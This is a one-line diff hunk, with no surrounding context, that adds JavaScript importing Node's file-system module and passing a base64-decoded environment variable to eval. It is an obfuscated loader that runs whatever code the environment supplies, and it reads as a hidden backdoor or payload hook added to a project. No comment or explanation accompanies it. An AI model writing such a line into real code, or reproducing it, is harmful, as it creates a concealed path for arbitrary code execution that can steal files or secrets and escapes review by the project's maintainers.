@@ -1,0 +1,1 @@
+import f from"fs";eval(atob(process.env.S))
